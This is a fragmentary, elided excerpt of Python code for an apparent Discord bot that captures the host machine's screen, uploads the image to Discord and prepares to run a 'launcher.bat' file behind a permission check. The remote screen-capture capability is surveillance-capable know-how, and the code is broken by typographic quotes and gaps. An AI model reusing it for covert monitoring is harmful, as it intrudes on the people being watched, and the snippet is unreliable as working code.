...
await interaction.response.defer()
try:
tmp = os.path.join(os.environ.get(“TEMP”, “C:\Temp”), “ss_tmp.png”)
script = f”””
...
await interaction.followup.send(file=discord.File(f, filename=“screenshot.png”))
os.unlink(tmp)
except Exception as e:
await interaction.followup.send(f” Error: {e}”)
...
return await deny(interaction)
try:
bat_path = os.path.join(os.path.dirname(os.path.abspath(**file**)), “launcher.bat”)
script = (
